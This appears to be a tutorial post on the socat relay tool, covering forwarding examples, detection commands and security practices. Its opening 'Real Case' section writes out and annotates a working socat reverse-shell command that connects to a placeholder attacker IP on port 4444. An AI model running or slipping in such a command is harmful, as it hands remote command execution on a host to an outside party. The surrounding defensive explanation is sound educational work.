What is socat?

socat (SOcket CAT) is a versatile command-line relay that forwards data between two arbitrary data channels (TCP, UDP, UNIX sockets, files, TTYs, stdio, etc.). It’s used for port forwarding, proxying, testing, and bridging different socket types on Linux/Unix systems.

Real Case

./socat tcp-connect:<YOUR_IP>:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane

  • ./socat — runs the socat binary from the current directory.
  • tcp-connect:<YOUR_IP>:4444 — open an outbound TCP connection to <YOUR_IP> on port 4444 (acts as a client connecting to a listener).
  • exec:/bin/sh — execute the shell /bin/sh; socat connects the shell’s input/output to the network channel.
  • pty — allocate a pseudo-TTY for the executed shell so the remote side receives an interactive terminal (enables line editing, control sequences, job control behavior).
  • stderr — include the shell’s standard error in the forwarded stream so error output is visible to the remote side.
  • setsid — start the shell in a new session (creates a separate process session for the child).
  • sigint — allow SIGINT (Ctrl-C) to be delivered/forwarded to the child process, improving interactive control.
  • sane — set the pseudo-TTY to "sane" terminal settings (reasonable defaults) so terminal input/output behaves correctly.
  • Net effect: when this command runs and connects, the remote listener on <YOUR_IP>:4444 receives an interactive shell session from the host running socat.
  • Security note: this effectively gives remote command execution on the host. Use only on systems you own or are explicitly authorized to administer. For legitimate remote access prefer SSH; monitor and restrict unexpected socat usage on production systems.

Why socat is useful

  • Bridge different address types (TCP↔UNIX, TCP↔TCP, STDIO↔socket) without writing code.
  • Quickly expose or forward services for admin/debugging, local testing, or temporary proxies.
  • Works with many options (reuseaddr, fork, SSL, pty) so it fits many network plumbing tasks.

Common, safe examples

  • Forward local TCP port to remote web server: 
    socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.0.0.5:80
    Listen on localhost:8080 and forward connections to 10.0.0.5:80 (useful for testing).
  • Expose a UNIX socket over TCP: 
    socat TCP-LISTEN:8080,reuseaddr,fork UNIX:/var/run/docker.sock
    Bridge a localhost TCP port to a UNIX domain socket for local tooling (admin only).
  • Connect two TCP endpoints (simple proxy): 
    socat TCP-LISTEN:9000,reuseaddr,fork TCP:internal.service:9000

Detection & investigation

  • Look for running processes: ps aux | grep socat.
  • Inspect listening sockets: ss -tulpn | grep socat or lsof -iTCP -sTCP:LISTEN.
  • Audit unexpected network bridges or child processes (e.g., ptys/executables spawned by socat).

Security notes & best practices

  • Only run socat on systems you control or are authorized to manage.
  • Prefer binding to 127.0.0.1 when exposing services locally; avoid binding to 0.0.0.0 unless required.
  • Run with least privilege (avoid root if not necessary) and restrict access with firewall rules.
  • Enable logging and monitor for unexpected socat invocations; restrict write access to scripts that launch socat.

Quick commands (copy/paste)

  • Show socat process + args: 
    ps -ef | grep '[s]ocat'
  • List listening sockets: 
    ss -tulpn | grep -E 'socat|LISTEN'
  • Test raw data transfer (local): 
    # on one terminal
socat -d -d TCP-LISTEN:12345,reuseaddr STDOUT
# on another:
printf 'hello\n' | socat - TCP:127.0.0.1:12345

Limitations & gotchas

  • socat is low-level — it won’t provide application protocol handling (TLS termination, HTTP parsing) unless you add options or wrap with other tools.
  • Misuse can expose shells, internal services, or create covert tunnels — treat socat like a powerful plumbing tool and restrict its use.
  • Some builds require OpenSSL for TLS support; features vary by distro/package.

Short security reminder

  • When accepting files or scripts that start network plumbing (socat included), validate provenance and review command arguments before execution.
